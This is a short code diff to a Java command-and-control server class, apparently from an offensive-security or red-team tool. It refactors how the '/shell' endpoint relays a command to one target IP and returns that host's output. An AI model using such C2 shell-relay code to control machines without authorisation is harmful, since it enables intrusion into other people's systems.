@@ -320,19 +320,11 @@ public class C2ServerAPI implements Runnable {
                     String scope = shellJSON.get("scope").toString();
                     String command = shellJSON.get("command").toString();
                     try{
-                        // Snapshot this host's responses before and after running the command,
-                        // then diff to collect only the new output. /shell targets one IP.
-                        ArrayList<String> before = C2server.snapshotResponsesForIP(scope);
-                        C2server.getShellResponse(scope, command);
-                        ArrayList<String> after = C2server.snapshotResponsesForIP(scope);
-
-                        StringBuilder shellResponse = new StringBuilder();
-                        for(int i = before.size(); i < after.size(); i++){
-                            shellResponse.append(after.get(i));
-                        }
+                        // /shell targets a single IP; block for that client's output
+                        String shellResponse = C2server.getShellResponse(scope, command);
 
                         JSONObject returnObject = new JSONObject();
-                        returnObject.put("output", shellResponse.toString());
+                        returnObject.put("output", shellResponse);
                         response = returnObject.toString();
                     } catch (Exception e){
                         JSONObject returnObject = new JSONObject();
